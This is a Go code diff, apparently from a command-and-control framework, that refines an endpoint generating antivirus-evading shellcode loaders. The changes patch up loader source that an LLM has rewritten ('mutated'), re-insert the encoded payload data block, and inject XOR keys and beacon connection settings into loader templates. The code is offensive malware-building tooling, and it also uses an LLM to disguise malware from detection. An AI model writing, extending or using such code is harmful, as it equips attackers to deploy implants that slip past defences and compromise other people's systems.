@@ -118,6 +118,10 @@ func (s *Server) c2LoaderGenerateAPI(w http.ResponseWriter, r *http.Request) {
 					break
 				}
 				// 数据块拼回：占位行换回完整数据
+				// 清洗：截取 package 声明行起（LLM 偶发前置杂音）
+				if pi := strings.Index(mutated, "package main"); pi > 0 {
+					mutated = mutated[pi:]
+				}
 				if strings.Count(mutated, "_ipv4Data") < 1 {
 					// 调试：落盘 LLM 返回与期望骨架，诊断占位符丢失形态
 					_ = os.WriteFile(filepath.Join(workRoot, "evasion-build", fmt.Sprintf("ai_mut_%d.log", attempt)), []byte(mutated), 0o644)
@@ -125,13 +129,32 @@ func (s *Server) c2LoaderGenerateAPI(w http.ResponseWriter, r *http.Request) {
 					log.Printf("[evasion] AI 变形第 %d 次产物校验不过（占位符丢失/重复），返回 %d bytes，已落盘诊断", attempt, len(mutated))
 					continue
 				}
+				// 数据块声明兜底：LLM 偶发连声明一起删（骨架 3KB 批次实测）——
+				// 引用在而声明缺 → 补最小空声明（下方拼回整体替换）
+				if !strings.Contains(mutated, "var _ipv4Data") {
+					mutated = strings.Replace(mutated, "func main()", 
+						"var _ipv4Data = []string{}\n\nfunc main()", 1)
+				}
 				// 数据块声明插到 func main() 之前（LLM 保留引用但不保留声明——实测一致）
 				insAt := strings.Index(mutated, "func main()")
 				if insAt < 0 {
 					log.Printf("[evasion] AI 变形第 %d 次产物无 func main()，弃", attempt)
 					continue
 				}
-				mut := mutated[:insAt] + dataBlock + "\n" + mutated[insAt:]
+					// 拼回（v3）：删除任意形态 _ipv4Data 声明（单行/多行/含 DATA 占位——
+					// 旧正则只认多行锚点，单行占位静默失配曾产出 1.7MB 空数据骨架），再把原始数据块插到 func main() 前。
+				reDeclAny := regexp.MustCompile(`(?s)var _ipv4Data = \[\]string\{[^}]*\}`)
+				stripped := reDeclAny.ReplaceAllString(mutated, "")
+				ins2 := strings.Index(stripped, "func main()")
+				if ins2 < 0 {
+					log.Printf("[evasion] AI 变形第 %d 次拼回失败（剥离声明后无 main）", attempt)
+					continue
+				}
+				mut := stripped[:ins2] + dataBlock + "\n" + stripped[ins2:]
+				if len(mut) < len(dataBlock) || strings.Count(mut, "var _ipv4Data") != 1 {
+					log.Printf("[evasion] AI 变形第 %d 次拼回失败（mut=%d data=%d）", attempt, len(mut), len(dataBlock))
+					continue
+				}
 				if !aiMutationSane(mut) {
 					log.Printf("[evasion] AI 变形第 %d 次产物校验不过（关键锚点缺失），重试", attempt)
 					continue
@@ -237,13 +260,16 @@ func renderEvasionLoader(tplPath string, pic []byte, trailerJSON string) (string
 	src = replaceVarBytes(src, "_xorKey2", k2)
 	// 补齐长度注入（t0 裁尾用；t1/t3 模板忽略此变量无碍）
 	src = strings.Replace(src, "var _padTail = 0", "var _padTail = "+fmt.Sprint(padTail), 1)
-	// 注入 trailer 配置（beacon donut 化后经 loader 自读获得连接参数）
+	// 注入 trailer 配置：
+	//   t0（落盘型）：写 _trailerJSON（GOC2_CFG_JSON 环境下发子进程）
+	//   t1/t3（shellcode 型）：写 __TRAILER_JSON__ 占位（loader 自追加 trailer）
 	tj := strings.TrimSpace(trailerJSON)
 	if tj == "" {
 		tj = "{}"
 	}
 	esc := strings.ReplaceAll(strings.ReplaceAll(tj, `\`, `\\`), `"`, `\"`)
 	src = strings.ReplaceAll(src, "__TRAILER_JSON__", esc)
+	src = strings.ReplaceAll(src, `[]byte("{}")`, "`"+esc+"`")
 	return src, nil
 }
 
